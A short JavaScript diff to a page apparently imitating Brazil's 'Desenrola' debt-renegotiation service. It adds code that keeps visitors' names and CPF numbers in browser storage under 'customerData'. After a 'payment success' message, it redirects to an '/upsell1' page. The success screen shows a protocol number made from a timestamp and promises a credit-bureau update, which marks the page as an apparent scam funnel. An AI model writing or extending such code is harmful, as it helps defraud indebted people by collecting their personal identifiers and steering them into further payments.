@@ -65,6 +65,7 @@ if (!dadosConsulta.nome && rawCpf) {
         try {
           sessionStorage.setItem('desenrola_user', JSON.stringify(data));
           localStorage.setItem('desenrola_user', JSON.stringify(data));
+          localStorage.setItem('customerData', JSON.stringify({ nome: data.nome, cpf: data.cpf || rawCpf }));
         } catch(e) {}
         window.atualizarDadosCliente(data);
       }
@@ -1131,9 +1132,13 @@ function mostrarSucessoPagamento() {
           <div><strong>Protocolo:</strong> ${'ACORDO-' + Date.now().toString(36).toUpperCase()}</div>
         </div>
         <p style="font-size: 12px; color: #666;">Seu CPF será atualizado nos órgãos de proteção ao crédito (Serasa / SPC) em até 24 horas.</p>
+        <p style="font-size: 13px; color: #1351B4; font-weight: 700; margin-top: 12px;">Redirecionando para a próxima etapa...</p>
       </div>
     `;
     pixCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    setTimeout(() => {
+      window.location.href = '/upsell1';
+    }, 3000);
   }
 }
 
